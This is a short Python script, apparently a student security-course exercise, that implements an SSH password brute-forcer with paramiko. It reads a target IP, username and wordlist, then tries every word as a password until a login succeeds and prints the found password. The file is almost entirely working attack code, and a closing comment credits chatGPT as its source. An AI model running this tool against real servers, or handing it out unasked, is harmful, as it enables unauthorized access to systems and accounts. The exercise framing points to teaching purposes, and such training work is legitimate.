#!/usr/bin/python3
# Lamin Touray
# Scripts: Add to your Python brute force tool the capability to:
# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.


import time
import paramiko

# Function to attempt SSH login with the provided credentials
def ssh_login(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, username=username, password=password)
        print(f"Success! The correct password is: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed login attempt using password: {password}")
        return False
    finally:
        ssh.close()

# Function to perform brute force SSH login using a word list file
def brute_force_ssh(ip, username, wordlist_file):
    with open(wordlist_file, "r") as f:
        for line in f:
            password = line.strip()
            if ssh_login(ip, username, password):
                break
            time.sleep(0.5)

# Main function to handle user input and call the appropriate function
def main():
    mode = input("Select a mode (1 for brute force SSH): ")

    if mode == "1":
        ip = input("Enter the IP address of the SSH server: ")
        username = input("Enter the username: ")
        wordlist_file = input("Enter the path to the word list file: ")
        brute_force_ssh(ip, username, wordlist_file)
    else:
        print("Invalid mode selected.")

# Entry point for the script
if __name__ == "__main__":
    main()


# Source: chatGPT
